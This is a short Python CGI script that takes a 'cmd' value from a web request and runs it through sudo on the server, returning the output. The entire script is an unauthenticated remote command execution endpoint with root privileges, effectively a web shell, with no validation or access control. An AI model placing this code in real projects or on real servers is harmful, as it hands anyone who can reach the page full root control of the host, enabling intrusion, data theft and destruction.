#!/usr/bin/python3
print("content-type:text/plain")
print()


import subprocess
import cgi

form = cgi.FieldStorage()
command = form.getvalue("cmd")
output = subprocess.getoutput("sudo "+command)
print(output)
